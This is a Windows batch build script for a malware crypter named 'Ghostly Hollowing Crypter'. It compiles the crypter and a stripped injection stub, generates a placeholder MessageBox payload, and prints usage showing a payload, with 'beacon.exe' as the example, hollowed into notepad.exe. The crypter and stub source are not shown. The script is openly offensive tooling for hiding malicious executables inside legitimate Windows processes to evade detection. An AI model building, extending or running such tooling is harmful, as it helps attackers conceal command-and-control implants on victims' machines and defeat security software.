@echo off
setlocal enabledelayedexpansion

echo ========================================
echo   Ghostly Hollowing Crypter - Build
echo ========================================
echo.

REM Configuration
set CRYPTER_SRC=crypter_ghostly.cpp
set STUB_SRC=stub_template.c
set STUB_OUT=stub_template.exe
set CRYPTER_OUT=crypter_ghostly.exe

REM Step 1: Compile crypter
echo [*] Compiling crypter...
x86_64-w64-mingw32-g++ -o %CRYPTER_OUT% %CRYPTER_SRC% -static
if %errorlevel% neq 0 (
    echo [-] Crypter compilation failed
    exit /b 1
)
echo [+] Crypter compiled: %CRYPTER_OUT%
echo.

REM Step 2: Compile stub template
echo [*] Compiling stub template...
x86_64-w64-mingw32-gcc -o %STUB_OUT% %STUB_SRC% -lntdll -lpsapi -O2 -masm=intel -s -fno-exceptions -fno-asynchronous-unwind-tables
if %errorlevel% neq 0 (
    echo [-] Stub compilation failed
    exit /b 1
)
echo [+] Stub compiled: %STUB_OUT%
echo.

REM Step 3: Prepare payload (replace with your actual payload)
if not exist "payload.exe" (
    echo [*] No payload.exe found, creating test payload...
    echo #include ^<windows.h^> > test_payload.c
    echo int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) { >> test_payload.c
    echo     MessageBoxA(NULL, "Ghostly Hollowing Success!", "Maximum Stealth", MB_OK); >> test_payload.c
    echo     return 0; >> test_payload.c
    echo } >> test_payload.c
    x86_64-w64-mingw32-gcc -o payload.exe test_payload.c -mwindows -O2 -s
    del test_payload.c
    echo [+] Test payload created: payload.exe
)

echo.
echo ========================================
echo   Build Complete
echo ========================================
echo.
echo Usage:
echo   %CRYPTER_OUT% payload.exe %STUB_OUT% C:\Windows\System32\notepad.exe
echo.
echo Example:
echo   crypter_ghostly.exe beacon.exe stub_template.exe C:\Windows\System32\notepad.exe